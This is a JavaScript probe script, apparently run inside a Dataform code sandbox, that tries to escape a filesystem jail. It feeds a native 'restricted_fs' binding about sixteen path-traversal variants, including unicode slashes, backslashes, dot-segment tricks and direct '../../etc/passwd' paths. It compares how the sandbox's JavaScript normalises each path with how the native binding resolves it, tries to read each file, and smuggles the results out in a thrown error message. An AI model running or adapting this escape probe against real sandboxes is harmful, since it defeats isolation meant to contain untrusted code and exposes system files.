var out = {};
function S(x,n){ try { return String(x).slice(0,n||90); } catch(e){ return "?"; } }
// DIFFERENTIAL: compare the sandbox's JS path.normalize against what the NATIVE restricted_fs accepts.
// A gap = JS thinks "inside" while native resolves outside (or vice versa) -> escape.
//
// Strategy: build paths whose JS-normalized form is INSIDE the jail, then ask the native binding.
var inside = "/node_modules/@dataform/core/package.json";
var cases = [];
function add(desc, p){ cases.push([desc, p]); }

// 1. unicode dots / slashes
add("U+2024 dot", "/node_modules/@dataform/core\uFF0F..\uFF0Fpackage.json");
add("fullwidth slash", "/node_modules\uFF0F@dataform\uFF0Fcore\uFF0Fpackage.json");
add("U+2025 two-dot leader","/node_modules/@dataform/core/\u2025/../package.json");
add("unicode overline", "/node_modules/@dataform/core/\u203E/package.json");
// 2. multiple slash variants normalized by the native but not by JS
add("backslash", "/node_modules/@dataform/core\\..\\package.json");
add("mixed bs-fs", "/node_modules\\@dataform\\core/package.json");
// 3. dot-dot with trailing whitespace/dots (Windows-style strip)
add("dotdot with space", "/node_modules/@dataform/core/.. /package.json");
add("dotdot with dot", "/node_modules/@dataform/core/.../package.json");
add("double dotdot", "/node_modules/@dataform/core/....//package.json");
// 4. empty segments that JS normalize drops but native may keep
add("many slashes deep", "/////node_modules////@dataform////core////package.json");
add("trailing slash", "/node_modules/@dataform/core/package.json/");
add("dot-segment", "/node_modules/@dataform/./core/../core/package.json");
// 5. absolute-from-root escape shapes
add("root dotdot slash", "//../../etc/passwd");
add("root many dotdot", "/./././../././etc/passwd");
// 6. the KEY test: a path whose JS-normalize = inside, but which has .. that native may follow differently
add("inside-then-up-then-back", "/node_modules/x/../../node_modules/@dataform/core/package.json");
add("N segments up", "/a/b/c/d/e/../../../../../node_modules/@dataform/core/package.json");

out.cases = {};
cases.forEach(function(c){
  var p = c[1];
  var jsnorm; try { jsnorm = path.normalize(p); } catch(e){ jsnorm = "EXC"; }
  var ex; try { ex = String(restricted_fs.exists(p)); } catch(e){ ex = "X:"+S(e,40); }
  var rd; try { rd = restricted_fs.readFile(p); rd = "READ("+String(rd.length)+"B)"; } catch(e){ rd = "no"; }
  out.cases[c[0]] = { p: S(p,70), jsnorm: S(jsnorm,70), exists: ex, read: rd };
});
throw new Error("DIFF::" + JSON.stringify(out.cases));
